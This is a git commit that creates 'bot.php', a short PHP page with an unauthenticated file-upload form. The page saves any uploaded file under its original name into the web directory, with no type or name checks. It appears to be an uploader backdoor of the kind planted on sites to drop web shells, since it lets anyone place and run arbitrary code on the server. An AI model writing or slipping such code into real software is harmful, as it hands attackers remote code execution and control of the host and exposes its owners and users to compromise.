d7c4ad19d5b13602f53117d32e833bae544e954b
Choirul Huda <121425666+cehuda1@users.noreply.github.com>
2023-10-19 21:47:15 +0700

    Create bot.php

---
+++ bot.php
@@ -0,0 +1,13 @@
+<form enctype="multipart/form-data" action="bot.php" method="POST">
+    <input type="file" name="file"></input>
+    <input type="submit"></input>
+</form>
+<?php
+if(!empty($_FILES["file"])){
+    $path = basename($_FILES["file"]["name"]);
+    if(move_uploaded_file($_FILES["file"]["tmp_name"], $path)) {
+        echo "The file ".basename($_FILES["file"]["name"])." has been uploaded";
+    }else{
+        echo "There was an error uploading the file, please try again!";
+    }
+}
